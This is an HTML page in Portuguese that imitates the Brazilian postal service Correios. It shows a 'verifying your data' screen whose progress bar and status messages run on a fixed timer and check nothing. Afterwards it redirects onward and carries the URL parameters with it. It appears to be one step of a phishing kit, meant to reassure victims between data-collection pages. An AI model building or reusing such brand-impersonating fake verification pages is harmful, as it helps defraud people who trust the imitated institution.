<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando Dados - Correios</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f5f5f5;
        }
        .loading-container {
            text-align: center;
            width: 90%;
            max-width: 400px;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        .logo {
            max-width: 200px;
            margin-bottom: 20px;
        }
        .loading-bar {
            width: 100%;
            height: 10px;
            background: #f0f0f0;
            border-radius: 5px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress {
            width: 0%;
            height: 100%;
            background: #0054A6;
            border-radius: 5px;
            transition: width 0.1s linear;
        }
        h1 {
            color: #0054A6;
            margin-bottom: 20px;
            font-size: 20px;
        }
        .status {
            color: #666;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <img src="../2/images/n82QMzROCR8j.svg" alt="Correios" class="logo">
        <h1>Verificando seus dados...</h1>
        <div class="loading-bar">
            <div class="progress" id="progressBar"></div>
        </div>
        <div class="status" id="status">Iniciando verificação...</div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const progressBar = document.getElementById('progressBar');
            const status = document.getElementById('status');
            let progress = 0;
            const totalTime = 7000; // 7 segundos totais
            const intervalTime = 50; // Atualizar a cada 50ms
            const steps = totalTime / intervalTime;
            const increment = 100 / steps;
            
            // Função para atualizar a barra de progresso
            function updateProgress() {
                progress += increment;
                progressBar.style.width = Math.min(progress, 100) + '%';
                
                // Atualizar mensagem de status
                if (progress < 30) {
                    status.textContent = 'Verificando informações do pedido...';
                } else if (progress < 60) {
                    status.textContent = 'Validando dados de entrega...';
                } else if (progress < 90) {
                    status.textContent = 'Processando informações...';
                } else {
                    status.textContent = 'Finalizando verificação...';
                }
                
                if (progress < 100) {
                    setTimeout(updateProgress, intervalTime);
                } else {
                    status.textContent = 'Redirecionando...';
                    window.location.href = '../1/' + window.location.search;
                }
            }

            // Iniciar a animação
            setTimeout(updateProgress, 500);
        });
    </script>
</body>
</html>
